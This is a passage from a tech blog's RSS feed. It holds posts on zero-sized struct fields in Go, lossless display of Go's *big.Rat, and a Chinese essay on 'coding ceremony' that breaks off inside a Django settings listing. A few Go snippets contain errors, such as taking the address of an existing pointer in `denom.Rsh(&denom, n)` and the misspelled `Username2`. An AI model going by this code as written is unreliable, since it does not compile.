      <content:encoded><![CDATA[<p >There’s a concept in Golang called <em>zero-sized type</em> (or ZST), namely, a type whose variables take up zero bit of memory. One of them is the famous <code>struct&#123;&#125;</code>. People often use <code>map[string]struct&#123;&#125;</code> to efficiently emulate a set structure. Others include zero-length arrays such as <code>[0]int</code>, albeit not very common, are adopted to enforce some properties of a customized type.</p><div class="gk-unified-code tab" data-gk-style="tab"><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="Comparability"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">type</span> UserName <span class="hljs-keyword">struct</span>{</span><br><span class="line">    name <span class="hljs-type">string</span></span><br><span class="line">    <span class="hljs-comment">// ZST [0]func() makes the surrounding type incomparable</span></span><br><span class="line">    _phantom [<span class="hljs-number">0</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">println</span>(UserName{name: <span class="hljs-string">&quot;a&quot;</span>} == UserName{name: <span class="hljs-string">&quot;b&quot;</span>})</span><br><span class="line"><span class="hljs-comment">// invalid operation: UserName{…} == UserName{…}</span></span><br><span class="line"><span class="hljs-comment">// (struct containing [0]func() cannot be compared)</span></span><br></pre></div></div><div class="gk-code hljs" data-gk-id="convert" data-gk-title="Convertibility"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">type</span> Tag <span class="hljs-keyword">struct</span>{</span><br><span class="line">    Value <span class="hljs-type">string</span></span><br><span class="line">    _tag <span class="hljs-keyword">struct</span>{}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">type</span> Id <span class="hljs-keyword">struct</span>{</span><br><span class="line">    Value <span class="hljs-type">string</span></span><br><span class="line">    _id <span class="hljs-keyword">struct</span>{}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> a = Tag{Value: <span class="hljs-string">&quot;Go&quot;</span>}</span><br><span class="line"><span class="hljs-keyword">var</span> b = Id(a)</span><br><span class="line"><span class="hljs-comment">// cannot convert a (variable of type Tag) to type Id</span></span><br></pre></div></div></div><p >One may think that a ZST variable always occupies 0 byte of space, which however is not the case. For example, the result of <code>unsafe.Sizeof</code> against UserName might surprise you:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">println</span>(unsafe.Sizeof(UserName{}), unsafe.Sizeof(<span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">// 24 16</span></span><br></pre></div></div><p >The size of UserName is 8 bytes greater than the size of a string, which means the field of <code>[0]func()</code> at the rear takes up exactly 8 bytes.</p><p >Well, this is heavy. The incorporation of ZSTs was aimed to ensure type safety without introducing any runtime overhead. However, if this implementation leads to an increased footprint, it may be considered less favorable. Why does it happen?</p><p >There’s an explanation from the Go team on <a href="https://github.com/golang/go/issues/58483#issuecomment-1427182579">Github</a>:</p><blockquote><p >[…] this means it (a pointer to ZST field) would actually point outside of the allocation.<br>Unlike many other languages, (C, C++, Rust, …) where creating pointer past the allocation (but not using it) is legal. In go it isn’t because the GC may at anytime inspect any pointer.</p></blockquote><p >This design serves as a precautionary measure to avoid any potential confusion for the Garbage Collector runtime. Roughly speaking, Go organizes allocated objects into several memory blocks. At the same time, Go provides users the flexibility to create pointers pointing to or within those objects. These pointers are inspected by the garbage collector from time to time, therefore they must point to somewhere valid within a memory block. Now think about an edge case:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">          memory block</span><br><span class="line"> ______________/\______________</span><br><span class="line">/                              \</span><br><span class="line">+-----+------------------------+----------------------+</span><br><span class="line">| ... |         name           | &lt;unallocated memory&gt; |</span><br><span class="line">+-----+------------------------+----------------------+</span><br><span class="line">       \__________  __________/|</span><br><span class="line">                  \/           |</span><br><span class="line">            u := UserName{}    |</span><br><span class="line">                              \|/</span><br><span class="line">                       p := &amp;(u._phantom)</span><br></pre></div></div><p >In this case, an object <code>u</code> of type UserName is placed at the end of a memory block. Meanwhile, a pointer <code>p</code> exists and points to its <code>_phantom</code> field. If the <code>_phantom</code> field took up zero byte, the pointer <code>p</code> would contain the address of right boundary of the memory block, which, once dereferenced by the GC, would lead to invalid access to unallocated memory. Hence, the Go compiler reserves additional bytes at the end of the UserName struct to prevent the occurrence of such cases.</p><p >That said, we do have solution to eliminate such overhead. As discussed in the same Github issue, reordering the ZST field to the middle of the struct eliminates the need for additional reserved bytes. This adjustment ensures that there is no possibility of a pointer pointing to the allocation boundary.</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">type</span> UserName2 <span class="hljs-keyword">struct</span>{</span><br><span class="line">    _phantom [<span class="hljs-number">0</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span></span><br><span class="line">    name <span class="hljs-type">string</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">println</span>(unsafe.Sizeof(Username2{})) <span class="hljs-comment">// 16</span></span><br></pre></div></div><p >Hence, whenever we want to employ the “ZST-trick”, it is crucial to ensure its placement at the middle of a struct.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Go/">Go</category>
      
      
      <comments>https://i.hsfzxjy.site/zst-at-the-rear-of-go-struct/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Display *big.Rat Losslessly and Smartly in Golang</title>
      <link>https://i.hsfzxjy.site/display-rat-losslessly-smartly-go/</link>
      <guid>https://i.hsfzxjy.site/display-rat-losslessly-smartly-go/</guid>
      <pubDate>Mon, 09 Oct 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Floating-point numbers, as we know, are notorious for losing precision when their values become too large or too small. They are also ba</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Floating-point numbers, as we know, are notorious for losing precision when their values become too large or too small. They are also bad at representing decimals accurately, yielding confusions like <code>0.1 + 0.2 != 0.3</code> for every beginner in their programming 101.</p><p >Albeit being imprecise, floats are good enough for most daily scenarios. For those not, however, Golang provides <code>*big.Rat</code> to the rescue. Rats are designed to represent rational numbers with arbitary precision, addressing most flaws of floats, yet at a cost of much slower computation speed and bigger memory footprint. For example, we are confident to compare <code>0.1 + 0.2</code> to <code>0.3</code> using Rats without caring about tolerance:</p><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="Floats vs Rats"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK1.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">    <span class="hljs-string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="hljs-string">&quot;math/big&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">    x, y := <span class="hljs-number">0.1</span>, <span class="hljs-number">0.2</span></span><br><span class="line">    f := x + y</span><br><span class="line">    fmt.Printf(<span class="hljs-string">&quot;%.20f %v\n&quot;</span>, f, f == <span class="hljs-number">0.3</span>)</span><br><span class="line">    <span class="hljs-comment">// 0.30000000000000004441 false</span></span><br><span class="line"></span><br><span class="line">    a, b := <span class="hljs-built_in">new</span>(big.Rat).SetFrac64(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>), <span class="hljs-built_in">new</span>(big.Rat).SetFrac64(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>)</span><br><span class="line">    c := <span class="hljs-built_in">new</span>(big.Rat).Add(a, b)</span><br><span class="line">    c2 := <span class="hljs-built_in">new</span>(big.Rat).SetFrac64(<span class="hljs-number">3</span>, <span class="hljs-number">10</span>)</span><br><span class="line">    fmt.Printf(<span class="hljs-string">&quot;%s %v\n&quot;</span>, c.FloatString(<span class="hljs-number">20</span>), c.Cmp(c2) == <span class="hljs-number">0</span>)</span><br><span class="line">    <span class="hljs-comment">// 0.30000000000000000000 true</span></span><br><span class="line">}</span><br></pre></div></div><p >You may have noticed that the Rats are initialized by the <code>z.SetFrac64(a, b)</code> method, which sets <code>z</code> to the fractional number <code>a/b</code>. In fact there’s even a <code>z.SetString()</code> to parse a Rat from either its fractional or decimal representation, which is a convenient utility:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">r1, ok1 := <span class="hljs-built_in">new</span>(big.Rat).SetString(<span class="hljs-string">&quot;3/5&quot;</span>)</span><br><span class="line">r2, ok2 := <span class="hljs-built_in">new</span>(big.Rat).SetString(<span class="hljs-string">&quot;0.6&quot;</span>)</span><br></pre></div></div><p >In the above listing, both <code>r1</code> and <code>r2</code> equal to the same number of 0.6. <code>.SetString()</code> smartly infers the input format and performs parsing.</p><p >Now let’s think about the reversed problem – how to display a <code>*big.Rat</code> as string smartly and loselessly?</p><p >To clarify, we would like to obtain a string <code>s</code> from the given Rat <code>z</code>. <code>s</code> is formatted as decimal when <code>z</code> could be written as finite decimal, and otherwise formatted as fractional. If we give name <code>SmartRatString()</code> to such a function, some samples may be:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">SmartRatString(<span class="hljs-built_in">new</span>(big.Rat).SetFrac64(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)) == <span class="hljs-string">&quot;0.6&quot;</span></span><br><span class="line">SmartRatString(<span class="hljs-built_in">new</span>(big.Rat).SetFrac64(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)) == <span class="hljs-string">&quot;1/3&quot;</span> <span class="hljs-comment">// instead of 0.33333...</span></span><br></pre></div></div><p >This is a legitimate use case. You may want to print out some numbers to the user, and expect they would be parsed <i>exactly</i> as they were if being typed back, for the motive of reproducibility or whatever. Simultaneously, the numbers should be in decimal form whenever they could, to conform the preference of human.</p><p >Unfortunately, <code>*big.Rat</code> does not come with such conversion method. The most relevant ones we could find are <a href="https://pkg.go.dev/math/big#Rat.RatString">RatString()</a> and <a href="https://pkg.go.dev/math/big#Rat.FloatString">FloatString(prec)</a>. <code>RatString()</code> always converts the Rat into fractional form <code>a/b</code>, while <code>FloatString(prec)</code> displays it as decimal form with exactly <code>prec</code> digits after the decimal point.</p><p >A straightforward thought is to combine the two utility methods in an adaptive way. If the Rat couldn’t be written as finite decimal, we call the <code>RatString()</code>. Otherwise, we compute the appropriate <code>prec</code> for <code>FloatString()</code> such that the Rat is converted into decimal form without any truncation. In such a way, we reduce the problem into two simpler ones:</p><ol><li>How to determine a Rat has a finite decimal representation?</li><li>How to compute the number of digits after the decimal point?</li></ol><p  class="par"> Answers to both problems concealed in the factorization of the denominator. Say we have a rational number $z=a/b$ where $b \in \mathbb{Z}^+$ and $gcd(a, b)=1$. $z$ has a finite decimal form if and only if $b=2^n5^m$ for some natural numbers $n$ and $m$, while $\max(n, m)$ being the number of digits after the decimal point. These conclusions can be derived from some easy math so we won’t discuss in this post.</p><p >The following section will focus on the implementation. We can sketch out the framework of <code>SmartRatString()</code>:</p><div class="gk-code hljs" data-gk-id="BLOCK4" data-gk-title="SmartRatString() Sketch"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SmartRatString</span><span class="hljs-params">(r *big.Rat)</span></span> <span class="hljs-type">string</span> {</span><br><span class="line">    denom := <span class="hljs-built_in">new</span>(big.Int).Set(r.Denom())</span><br><span class="line">    n := ... <span class="hljs-comment">// compute 2&#x27;s power in the factorization of denom</span></span><br><span class="line">    <span class="hljs-comment">// denom = denom / 2^n</span></span><br><span class="line">    m, isFiveExp := ... <span class="hljs-comment">// check power of 5</span></span><br><span class="line">    <span class="hljs-keyword">if</span> !isFiveExp {</span><br><span class="line">        <span class="hljs-keyword">return</span> r.RatString()</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> r.FloatString(<span class="hljs-type">int</span>(max(n, m)))</span><br><span class="line">}</span><br></pre></div></div><p >Estimating <code>n</code> is the easiest part. We can compute <code>n</code> by counting zero bits at the rear of <code>denom</code>‘s binary form, with the help of <code>TrailingZeroBits()</code> method. Dividing <code>denom</code> by <code>2^n</code> can also be achieved efficiently with bitwise right shifting. We complete the first blank as follows:</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK5.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SmartRatString</span><span class="hljs-params">(r *big.Rat)</span></span> <span class="hljs-type">string</span> {</span><br><span class="line">    denom := <span class="hljs-built_in">new</span>(big.Int).Set(r.Denom())</span><br></span><span class="line">    n := denom.TrailingZeroBits()</span><br><span class="line">    denom.Rsh(&amp;denom, n)</span><br><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK5.SEC2" data-gk-type="zip"><span class="line">    m, isFiveExp := ... <span class="hljs-comment">// check power of 5</span></span><br><span class="line">    <span class="hljs-keyword">if</span> !isFiveExp {</span><br><span class="line">        <span class="hljs-keyword">return</span> r.RatString()</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> r.FloatString(<span class="hljs-type">int</span>(max(n, m)))</span><br><span class="line">}</span><br></span></pre></div></div><p >For the second part, however, there’s no shortcut, at least I don’t have an idea. We have to iteratively divide <code>denom</code> by 5 until the process cannot proceed. For readability I write a small function <code>log5</code>:</p><div class="gk-code hljs" data-gk-id="log5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span> intOne = <span class="hljs-built_in">new</span>(big.Int).SetUint64(<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-keyword">var</span> intFive = <span class="hljs-built_in">new</span>(big.Int).SetUint64(<span class="hljs-number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// log5 checks x in the form of $5^m$ or not. If so, isExp is true</span></span><br><span class="line"><span class="hljs-comment">// and cnt stores the power $m$.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">log5</span><span class="hljs-params">(x *big.Int)</span></span> (cnt <span class="hljs-type">uint</span>, isExp <span class="hljs-type">bool</span>) {</span><br><span class="line">    tmp2 := <span class="hljs-built_in">new</span>(big.Int)</span><br><span class="line">    m := <span class="hljs-built_in">new</span>(big.Int)  <span class="hljs-comment">// m stores the modulo</span></span><br><span class="line">    <span class="hljs-keyword">for</span> x.CmpAbs(intOne) &gt; <span class="hljs-number">0</span> {</span><br><span class="line">        tmp2.DivMod(x, intFive, m)</span><br><span class="line">        <span class="hljs-keyword">if</span> m.Sign() != <span class="hljs-number">0</span> {  <span class="hljs-comment">// m != 0</span></span><br><span class="line">            <span class="hljs-keyword">return</span> cnt, <span class="hljs-literal">false</span></span><br><span class="line">        }</span><br><span class="line">        cnt++</span><br><span class="line">        x, tmp2 = tmp2, x</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> cnt, <span class="hljs-literal">true</span></span><br><span class="line">}</span><br></pre></div></div><p >This function is not efficient but it serves the purpose. We modify the second part of <code>SmartRatString()</code> accordingly:</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK6.SEC1" data-gk-type="zip"><span class="gk-section gk-include" data-gk-sid="BLOCK6.SEC2" data-gk-type="include"data-gk-referee="log5"><span class="line"><span class="hljs-keyword">var</span> intOne = <span class="hljs-built_in">new</span>(big.Int).SetUint64(<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-keyword">var</span> intFive = <span class="hljs-built_in">new</span>(big.Int).SetUint64(<span class="hljs-number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// log5 checks x in the form of $5^m$ or not. If so, isExp is true</span></span><br><span class="line"><span class="hljs-comment">// and cnt stores the power $m$.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">log5</span><span class="hljs-params">(x *big.Int)</span></span> (cnt <span class="hljs-type">uint</span>, isExp <span class="hljs-type">bool</span>) {</span><br><span class="line">    tmp2 := <span class="hljs-built_in">new</span>(big.Int)</span><br><span class="line">    m := <span class="hljs-built_in">new</span>(big.Int)  <span class="hljs-comment">// m stores the modulo</span></span><br><span class="line">    <span class="hljs-keyword">for</span> x.CmpAbs(intOne) &gt; <span class="hljs-number">0</span> {</span><br><span class="line">        tmp2.DivMod(x, intFive, m)</span><br><span class="line">        <span class="hljs-keyword">if</span> m.Sign() != <span class="hljs-number">0</span> {  <span class="hljs-comment">// m != 0</span></span><br><span class="line">            <span class="hljs-keyword">return</span> cnt, <span class="hljs-literal">false</span></span><br><span class="line">        }</span><br><span class="line">        cnt++</span><br><span class="line">        x, tmp2 = tmp2, x</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> cnt, <span class="hljs-literal">true</span></span><br><span class="line">}</span><br></span><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SmartRatString</span><span class="hljs-params">(r *big.Rat)</span></span> <span class="hljs-type">string</span> {</span><br><span class="line">    denom := <span class="hljs-built_in">new</span>(big.Int).Set(r.Denom())</span><br><span class="line">    n := denom.TrailingZeroBits()</span><br><span class="line">    denom.Rsh(&amp;denom, n)</span><br></span><span class="line">    m, isFiveExp := log5(&amp;denom)</span><br><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK6.SEC3" data-gk-type="zip"><span class="line">    <span class="hljs-keyword">if</span> !isFiveExp {</span><br><span class="line">        <span class="hljs-keyword">return</span> r.RatString()</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> r.FloatString(<span class="hljs-type">int</span>(max(n, m)))</span><br><span class="line">}</span><br></span></pre></div></div><p >With all these in hand, we have finished the complete function of <code>SmartRatString()</code>.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Math/">Math</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Go/">Go</category>
      
      
      <comments>https://i.hsfzxjy.site/display-rat-losslessly-smartly-go/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>代码的仪式</title>
      <link>https://i.hsfzxjy.site/coding-ceremory/</link>
      <guid>https://i.hsfzxjy.site/coding-ceremory/</guid>
      <pubDate>Wed, 06 Sep 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;我们常能在英文社区看到 coding ceremory 一词，或译为 代码的仪式。Stack Overflow 上有个问题 &lt;a href=&quot;https://stackoverflow.com/questions/68092498/what-does-low-ceremo</description>
        
      
      
      
      <content:encoded><![CDATA[<p >我们常能在英文社区看到 coding ceremory 一词，或译为 代码的仪式。Stack Overflow 上有个问题 <a href="https://stackoverflow.com/questions/68092498/what-does-low-ceremony-mean">What does “low ceremony” mean?</a>，作者曾如此提问：</p><blockquote><p >In the Trac Main Features page https://trac.edgewall.org/wiki/TracFeatures, Trac is said to emphasize “ease of use and low ceremony”. Can someone please explain what “ceremony” means in the context of software usage?</p></blockquote><p  class="par"> low ceremony 与 ease of use 作并列短语，可见在程序开发的语境下，代码的仪式不是一个褒义词——过多的仪式并没有好处。用户 Rowan Freeman 则作此回答：</p><blockquote><p >Low ceremony means a small amount of code to achieve something. It means you don’t need to set up a lot of things in order to get going.</p></blockquote><p  class="par"> 如其所述，代码的仪式是<strong>完成一个功能所需要的额外准备</strong>。仪式越少，准备工作越简洁，完成起来也越容易。</p><p >代码仪式被称为仪式，正如古代祭祀的舞蹈，传统庆典的繁文缛节，其对完成目标贡献甚微，却又是不可或缺的步骤。复杂的仪式冗长而乏味，我们偏偏还得忍受其枯燥，如履薄冰，完成得分毫不差——这也解释了为什么大多数人都不喜欢代码仪式。</p><h2 id="不同的代码仪式">不同的代码仪式</h2><p >依照呈现的形式，代码的仪式可以分为 编写仪式 和 运行仪式 两类。</p><h3 id="编写仪式">编写仪式</h3><p ><strong>编写仪式</strong>指完成功能我们所需编写的额外代码。其中最基本的一类源自编程语言对程序完整性的要求。每种编程语言会要求用户以特定的方式编写代码，如此方能产生可运行的程序，如 C/C++ 需要定义 <code>main()</code> 函数，旧式 Java 需要声明带有 <code>public static void main()</code> 方法的类等等：</p><div class="gk-unified-code tab" data-gk-style="tab"><div class="gk-code hljs" data-gk-id="py-hello-world" data-gk-title="Python"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello world&quot;</span>)</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="c-hello-world" data-gk-title="C"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="java-hello-world" data-gk-title="Java 1.8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorld</span> {</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {</span><br><span class="line">        System.out.println(<span class="hljs-string">&quot;Hello, World&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="haskell-hello-world" data-gk-title="Haskell"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">main</span> :: <span class="hljs-type">IO</span> ()</span><br><span class="line"><span class="hljs-title">main</span> = putStrLn <span class="hljs-string">&quot;Hello, World!&quot;</span></span><br></pre></div></div><div class="gk-code hljs" data-gk-id="nasm-hello-world" data-gk-title="NASM (x86, Unix)"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">SECTION</span> .DATA</span><br><span class="line"><span class="hljs-symbol">    hello:</span>     <span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;Hello world!&#x27;</span>,<span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-symbol">    helloLen:</span>  <span class="hljs-built_in">equ</span> $-hello</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">; Code goes in the text section</span></span><br><span class="line"><span class="hljs-meta">SECTION</span> .TEXT</span><br><span class="line">    <span class="hljs-meta">GLOBAL</span> _start</span><br><span class="line"><span class="hljs-symbol"></span></span><br><span class="line"><span class="hljs-symbol">_start:</span></span><br><span class="line">    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">4</span>            <span class="hljs-comment">; &#x27;write&#x27; system call = 4</span></span><br><span class="line">    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-number">1</span>            <span class="hljs-comment">; file descriptor 1 = STDOUT</span></span><br><span class="line">    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,hello        <span class="hljs-comment">; string to write</span></span><br><span class="line">    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,helloLen     <span class="hljs-comment">; length of string to write</span></span><br><span class="line">    <span class="hljs-keyword">int</span> <span class="hljs-number">80h</span>              <span class="hljs-comment">; call the kernel</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">; Terminate program</span></span><br><span class="line">    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">1</span>            <span class="hljs-comment">; &#x27;exit&#x27; system call</span></span><br><span class="line">    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-number">0</span>            <span class="hljs-comment">; exit with error code 0</span></span><br><span class="line">    <span class="hljs-keyword">int</span> <span class="hljs-number">80h</span>              <span class="hljs-comment">; call the kernel</span></span><br></pre></div></div></div><p  class="par"> 可见不同编程语言对“程序完整性”的要求有繁有简，短者如 Python 基本没有要求，长者如汇编语言（NASM）需要手动标注代码段与数据段。但这类仪式基本是一次性的，只需在项目伊始完成，较于漫长的开发工作简直不值一提。</p><p >编写仪式也可能源于软件框架的规范要求。软件框架简化了大型程序开发的流程，针对特定领域需求构建好了程序的蓝图，事无巨细皆有覆盖。开发者借助框架开发，就好比对照蓝图搭积木，只需编写上层业务相关代码即可。在简化开发的同时，软件框架通常会束缚代码的组织形式。若以复杂性为轴，我们可以绘制一幅软件框架的光谱。框架的对代码组织形式的约束依其在光谱上的位置而大相径庭。</p><p >光谱的一端是轻量级框架。它们有着精简的内核与宽松的规范约束。大多数轻量级框架并不强求规范的目录结构，开发者只需添加少量仪式以完成必要的程序初始化。以知名 Web 框架 <a href="https://flask.palletsprojects.com/en/2.3.x/">Flask</a> 为例。作为轻量级框架的代表，Flask 只负责做好与网络协议相关的工作，给予开发者十足的自由决定更上层逻辑的表现。借助 Flask，仅需寥寥数行代码即可构建一个最简单的 Web 程序：</p><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="app.py"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;Hello, World!&lt;/p&gt;&quot;</span></span><br></pre></div></div><p  class="par"> 某种意义上，这类框架可以被看作领域特定语言 <sup id="fnref:1"><a href="#fn:1">1</a></sup>，如 Flask 像是基于 Python 为 Web 开发设计的一门“语言”。以语言作类比使我们能套用前文对编程语言仪式的分析，将此类框架的仪式看作其寄主语言仪式的延伸。上面所示的代码中，<code>from flask import Flask</code> 与 <code>app = Flask(__name__)</code> 等套路化的代码，即是源自虚构的“Flask 语言”对程序完整性的要求。</p><p >光谱的另一端是重量级框架。相较于轻量级框架，重量级框架会向上层业务延伸自己的责任边界。它们的设计者通常更精通领域的业务，了解常见问题，通晓最佳实践，并尝试将这些经验融入框架中以服务开发者。</p><p >但事实上业务需求是多变的，设计者需要让框架足够灵活、足够可定制，方能满足现实中开发者的需求。灵活可定制，随之而来的代价便是框架日趋复杂。设计者或是抬高框架的抽象程度，应用设计模式使各种模块易于组合拆解；或是提供眼花缭乱的可配置项，迎合每一个潜在的需求点。前者使样板代码（boilerplate code）膨胀，后者使最佳实践难写——这些都是重量级框架仪式的体现。</p><p >我们还是以 Python Web 框架举例，但这次是著名的 <a href="https://www.djangoproject.com/">Django</a>。和 Flask 相比，一个典型的 Django 项目需包含多个文件，并以特定的结构组织在一起。其目录结构和部分文件内容如下：</p><div class="gk-unified-code tab" data-gk-style="tab"><div class="gk-code hljs" data-gk-id="django-dir" data-gk-title="mysite/"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="django-dir.SEC1" data-gk-type="zip"><span class="line">├── manage.py</span><br><span class="line">├── mysite</span><br><span class="line">│   ├── asgi.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   └── wsgi.py</span><br><span class="line">└── polls</span><br><span class="line">    ├── admin.py</span><br><span class="line">    ├── apps.py</span><br><span class="line">    ├── __init__.py</span><br><span class="line">    ├── migrations</span><br><span class="line">    │   └── __init__.py</span><br><span class="line">    ├── models.py</span><br><span class="line">    ├── tests.py</span><br><span class="line">    └── views.py</span><br></span><span class="line">3 directories, 13 files</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK2" data-gk-title="settings.py"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Build paths inside the project like this: BASE_DIR / &#x27;subdir&#x27;.</span></span><br><span class="line">BASE_DIR = Path(__file__).resolve().parent.parent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Quick-start development settings - unsuitable for production</span></span><br><span class="line"><span class="hljs-comment"># See https://docs.djangoproject.com/en/4.2/howto/deployment/checklist/</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># SECURITY WARNING: keep the secret key used in production secret!</span></span><br><span class="line">SECRET_KEY = <span class="hljs-string">&quot;django-insecure-kqi@xv-ay@y!c2es$5m)b&amp;uulbt-l8g28kw-)o2$&amp;w#@2uvx#&amp;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># SECURITY WARNING: don&#x27;t run with debug turned on in production!</span></span><br><span class="line">DEBUG = <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">ALLOWED_HOSTS = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Application definition</span></span><br><span class="line"></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.admin&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.auth&quot;</span>,</span><br><span class="line">    <span 